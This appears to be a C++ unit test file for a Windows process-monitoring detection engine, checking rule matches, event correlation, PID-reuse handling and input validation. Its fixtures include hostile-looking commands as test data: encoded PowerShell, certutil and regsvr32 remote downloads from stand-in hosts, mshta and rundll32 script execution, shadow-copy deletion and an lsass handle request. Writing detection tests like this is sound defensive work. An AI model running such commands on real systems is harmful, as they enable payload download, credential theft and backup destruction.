#include "engine.hpp"
#include <fstream>
#include <iostream>
#include <stdexcept>
using namespace rs;
static int checks=0;
static void check(bool value,const char* message) { ++checks; if(!value) throw std::runtime_error(message); }
template<class F> static void rejects(F action,const char* message) { bool rejected=false; try { action(); } catch(const std::exception&) { rejected=true; } check(rejected,message); }
static Event start(std::uint64_t seq,std::uint32_t pid,std::string image,std::string command="",std::uint32_t parent=0,std::uint64_t time=1000) {
    Event e; e.sequence=seq; e.pid=pid; e.image=std::move(image); e.command=std::move(command); e.parent=parent; e.time_ms=time; e.type="process_start"; return e;
}
static bool has(const std::vector<Json>& alerts,const char* rule) { for(const auto& a:alerts) if(a["rule_id"]==rule) return true; return false; }
int main(int argc,char** argv) {
 try {
    if(argc!=2) return 2; std::ifstream input(argv[1]); Json rules; input>>rules;
    Engine engine(rules);
    check(engine.consume(start(1,100,"C:\\Office\\WINWORD.EXE")).empty(),"benign office");
    auto powershell=start(2,200,"C:\\Windows\\powershell.exe","powershell.exe -NoProfile -EncodedCommand TEST",100);
    auto alerts=engine.consume(powershell);
    check(has(alerts,"RS-001"),"office child"); check(has(alerts,"RS-002"),"encoded command"); check(has(alerts,"RS-C01"),"same-event chain");
    check(alerts.back()["risk"]==100,"risk cap");
    Event handle; handle.sequence=3; handle.time_ms=1200; handle.pid=200; handle.target=300; handle.access=42; handle.type="handle_request";
    alerts=engine.consume(handle); check(has(alerts,"RS-009")&&has(alerts,"RS-C02"),"multi-event chain");
    handle.sequence=4; check(engine.consume(handle).empty(),"dedupe within window");
    rejects([&]{engine.consume(handle);},"duplicate sequence rejection");
    handle.sequence=5; handle.time_ms=300000; alerts=engine.consume(handle);
    check(has(alerts,"RS-009")&&!has(alerts,"RS-C02"),"correlation expires");
    auto reused=start(6,200,"notepad.exe"); check(engine.consume(reused).empty(),"PID reuse clears identity");
    auto state=engine.snapshot(); check(state["processes"].size()==3,"retained generations");
    check(state["processes"][1]["active"]==false,"old PID generation closed");
    check(state["processes"][2]["id"]=="200:6","unique generation");
    // powershell.exe accepts -ec, unambiguous prefixes and a "/" switch character; certutil takes "/" too
    Engine variants(rules);
    check(has(variants.consume(start(1,11,"powershell.exe","powershell -ec VABFAFMAVAA=")),"RS-002"),"-ec alias");
    check(has(variants.consume(start(2,12,"pwsh.exe","pwsh /enc VABFAFMAVAA=")),"RS-002"),"slash switch");
    check(has(variants.consume(start(3,13,"certutil.exe","certutil /urlcache /f http://x.test/a a")),"RS-005"),"certutil slash switch");
    check(has(variants.consume(start(4,14,"mshta.exe","mshta vbscript:Execute(\"CreateObject(\"\"WScript.Shell\"\")\")")),"RS-011"),"mshta inline script");
    check(has(variants.consume(start(5,15,"regsvr32.exe","regsvr32 /s /n /u /i:https://x.test/a.sct scrobj.dll")),"RS-012"),"regsvr32 scriptlet");
    Engine local_registration(rules);
    check(local_registration.consume(start(1,20,"regsvr32.exe","regsvr32 /s C:\\Program Files\\App\\app.dll")).empty(),"local dll registration");
    Engine false_positives(rules);
    check(false_positives.consume(start(1,1,"powershell.exe","powershell -File C:\\scripts\\-encodedcommand.ps1")).empty(),"switch token boundary");
    check(false_positives.consume(start(2,2,"mshta.exe","mshta C:\\local.hta")).empty(),"local hta");
    check(false_positives.consume(start(3,3,"certutil.exe","certutil -hashfile test SHA256")).empty(),"hashfile benign");
    check(false_positives.consume(start(4,4,"schtasks.exe","schtasks /query")).empty(),"query benign");
    Engine target(rules); target.consume(start(1,500,"lsass.exe")); target.consume(start(2,501,"tool.exe"));
    handle.sequence=3; handle.pid=501; handle.target=500; handle.time_ms=1000; handle.access=16;
    check(has(target.consume(handle),"RS-008"),"lsass read request");
    Engine enrich(rules); handle.sequence=1; handle.target_image="C:\\Windows\\System32\\lsass.exe"; handle.process_image="test.exe";
    check(has(enrich.consume(handle),"RS-008"),"preexisting target enrichment");
    check(enrich.snapshot()["processes"][0]["image"]=="test.exe","preexisting actor enrichment");
    Engine image(rules); image.consume(start(1,7,"svchost.exe"));
    Event load; load.sequence=2; load.pid=7; load.type="image_load"; load.image="C:\\Users\\Public\\test.dll"; load.time_ms=1000;
    check(has(image.consume(load),"RS-010"),"user DLL load");
    Engine limited(rules,2); for(unsigned i=1;i<=3;++i) limited.consume(start(i,i,"test.exe"));
    check(limited.snapshot()["evictions"]==1&&limited.snapshot()["processes"].size()==2,"bounded history");
    check(engine.health(1,0,100).is_object(),"loss health"); check(engine.health(1,0,101).is_null(),"loss dedupe");
    check(engine.health(1,1,102).is_object(),"allocation loss health");
    auto parsed=parse_event(event_json(powershell)); check(parsed.command==powershell.command,"event roundtrip");
    auto bad=event_json(powershell); bad["pid"]=-1; rejects([&]{parse_event(bad);},"negative pid");
    bad=event_json(powershell); bad["sequence"]=0; rejects([&]{parse_event(bad);},"zero sequence");
    bad["sequence"]=1; bad["type"]="unknown"; rejects([&]{parse_event(bad);},"unknown type");
    bad=event_json(powershell); bad["pid"]=4294967296ULL; rejects([&]{parse_event(bad);},"oversized pid");
    auto bad_rules=rules; bad_rules["rules"].push_back(rules["rules"][0]); rejects([&]{Engine invalid(bad_rules);},"duplicate rule");
    bad_rules=rules; bad_rules["rules"][0]["typo"]=true; rejects([&]{Engine invalid(bad_rules);},"unknown rule key");
    Engine expired(rules); expired.consume(powershell); expired.consume(start(3,901,"test.exe","",0,999999));
    check(expired.snapshot()["processes"][0]["risk"]==0,"inactive process risk expiry");
    Event exit; exit.sequence=4; exit.pid=901; exit.type="process_exit"; exit.time_ms=1000000; expired.consume(exit);
    check(expired.snapshot()["processes"][1]["active"]==false,"process exit");
    Engine parents(rules);
    parents.consume(start(1,1,"winword.exe")); parents.consume(start(2,2,"child.exe","",1));
    parents.consume(start(3,1,"notepad.exe"));
    check(parents.snapshot()["processes"][1]["parent_id"]=="1:1","parent generation survives PID reuse");
    const std::vector<std::pair<Event,const char*>> positive{
        {start(1,1,"mshta.exe","mshta https://example.invalid/demo"),"RS-003"},
        {start(1,1,"rundll32.exe","rundll32 javascript:demo"),"RS-004"},
        {start(1,1,"certutil.exe","certutil -urlcache https://example.invalid/demo"),"RS-005"},
        {start(1,1,"schtasks.exe","schtasks /create"),"RS-006"},
        {start(1,1,"vssadmin.exe","vssadmin delete shadows"),"RS-007"}
    };
    for(const auto& [event,rule]:positive) { Engine test(rules); check(has(test.consume(event),rule),"rule positive"); }
    bad_rules=rules; bad_rules["rules"][0]["severity"]="typo"; rejects([&]{Engine invalid(bad_rules);},"invalid severity");
    bad_rules=rules; bad_rules["rules"][0]["score"]=1.5; rejects([&]{Engine invalid(bad_rules);},"fractional score");
    std::cout<<checks<<" C++ detection and state checks passed\n"; return 0;
 } catch(const std::exception& e) { std::cerr<<"Engine test: "<<e.what()<<'\n'; return 1; }
}
